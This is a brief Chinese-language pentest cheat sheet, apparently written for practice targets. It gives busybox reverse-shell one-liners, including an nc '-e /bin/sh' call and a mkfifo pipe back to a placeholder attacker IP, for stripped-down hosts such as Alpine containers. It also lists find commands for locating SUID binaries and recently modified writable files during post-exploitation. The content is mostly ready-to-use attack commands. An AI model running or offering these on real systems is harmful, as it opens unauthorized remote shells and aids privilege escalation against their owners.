# 反弹shell

考虑busybox反弹shell的情况

  • 靶机没有nc、ncat等反弹shell工具
  • 阉割版nc，不具备反弹shell功能
  • sh、bash反弹shell管道存在问题
  • 使用Alpine Linux做基础镜像的容器，工具较少
busybox nc 攻击机IP 端口 -e /bin/sh 
# 创建命名管道
busybox mkfifo /tmp/f
/bin/sh -i 2>&1 < /tmp/f | busybox nc 攻击者IP 端口 > /tmp/f

# 文件查找

查找最近7天变动文件的方法，打群友靶机可能有奇效（）

find / -perm -4000  2>/dev/null

# 查找最近7天变动的可写文件
find / -writable -mtime -7 2>/dev/null

# 只找文件（排除目录）
find / -type f -mtime -7 2>/dev/null

# 减少噪音，排除系统目录
find / \( -path /run -o -path /sys -o -path /proc -o -path /var/lib -o -path /dev -o -path /usr/share -o -path /var/log -o -path /var/cache -o -path /etc \) -prune -o -print 2>/dev/null
